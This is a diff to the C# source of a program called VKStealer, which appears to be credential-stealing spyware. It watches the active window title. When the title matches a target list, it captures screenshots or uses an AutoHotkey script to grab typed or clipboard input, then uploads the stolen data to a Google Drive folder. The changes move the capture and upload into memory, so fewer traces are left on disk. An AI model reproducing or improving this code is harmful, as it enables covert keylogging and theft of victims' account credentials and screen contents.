@@ -18,6 +18,8 @@ using System.Security.Cryptography.X509Certificates;
 using System.Configuration;
 using System.Threading.Tasks;
 using System.ComponentModel;
+using System.Drawing.Imaging;
+using Google.Apis.Upload;
 
 namespace VKStealer
 {
@@ -85,30 +87,51 @@ namespace VKStealer
                     DriveService service = CreateService();
                     if (service != null)
                     {
+                        AutoHotkeyEngine autoHotKeyEngine = AutoHotkeyEngine.Instance;
+                        try
+                        {
+                            autoHotKeyEngine.LoadFile(ConfigurationManager.AppSettings["scriptPath"]);
+                        }
+                        catch 
+                        {
+                            listData.Clear();
+                        } 
                         while (true)
                         {
                             IntPtr handle = GetForegroundWindow();
                             string title = GetActiveWindowTitle(handle);
                             if (title != null)
                             {
-                                string windowTitle = listScreen.FirstOrDefault(x => title.Contains(x));
-                                if (windowTitle != null)
+                                if (listData.Count > 0)
                                 {
-                                    string fileName = DateTime.Now.ToString("HH_mm_ss_ffffff") + ".bmp";
-                                    ImageFromScreen(handle).Save(fileName);
-                                    UploadFile(service, fileName, "image/bmp", windowTitle);
-                                    Thread.Sleep(10000);
+                                    string windowTitle = listData.FirstOrDefault(x => title.Contains(x));
+                                    if (windowTitle != null)
+                                    {
+                                        string input = autoHotKeyEngine.ExecFunction("InputClip");
+                                        if (input != string.Empty)
+                                        {
+                                            using (IO.MemoryStream stream = new IO.MemoryStream())
+                                            {
+                                                byte[] buffer = Encoding.UTF8.GetBytes(input);
+                                                stream.Write(buffer, 0, buffer.Length);
+                                                UploadFile(service, stream, DateTime.Now.ToString("HH_mm_ss_ffffff") + ".txt", "image/plain", windowTitle);
+                                            }
+                                        }
+                                    } 
                                 }
-                                windowTitle = listData.FirstOrDefault(x => title.Contains(x));
-                                if (windowTitle != null)
+                                if (listScreen.Count > 0)
                                 {
-                                    string fileName = DateTime.Now.ToShortDateString() + ".txt";
-                                    AutoHotkeyEngine autoHotKeyEngine = AutoHotkeyEngine.Instance;
-                                    autoHotKeyEngine.ExecRaw("Input, kl, V L1, {Enter}");
-                                    IO.File.AppendAllText(fileName, autoHotKeyEngine.GetVar("kl"));
-                                    UploadFile(service, fileName, "image/plain", windowTitle);
+                                    string windowTitle = listScreen.FirstOrDefault(x => title.Contains(x));
+                                    if (windowTitle != null)
+                                    {
+                                        using (IO.MemoryStream stream = new IO.MemoryStream())
+                                        {
+                                            ImageFromScreen(handle).Save(stream, ImageFormat.Png);
+                                            UploadFile(service, stream, DateTime.Now.ToString("HH_mm_ss_ffffff") + ".png", "image/png", windowTitle);
+                                        }
+                                        Thread.Sleep(10000);
+                                    }
                                 }
-
                             }
                         }
                     }
@@ -238,7 +261,7 @@ namespace VKStealer
             }
         }
 
-        private async void UploadFile(DriveService service, string fileName, string mimeType, string windowTitle)
+        private void UploadFile(DriveService service, IO.MemoryStream stream, string fileName, string mimeType, string windowTitle)
         {
             string folderVKStealerID = SearchFolder(service, "VKStealer");
             if (folderVKStealerID == null)
@@ -275,20 +298,13 @@ namespace VKStealer
                         };
                         try
                         {
-                            using (IO.FileStream stream = new IO.FileStream(fileName, IO.FileMode.Open))
-                            {
-                                FilesResource.InsertMediaUpload request = service.Files.Insert(fileMetadata, stream, mimeType);
-                                request.Fields = "id";
-                                await request.UploadAsync();
-                            }
+                            FilesResource.InsertMediaUpload request = service.Files.Insert(fileMetadata, stream, mimeType);
+                            request.Fields = "id";
+                            request.Upload();
                         }
                         catch
                         {
 
-                        }
-                        finally
-                        {
-                            IO.File.Delete(fileName);
                         }
                     }
                 }
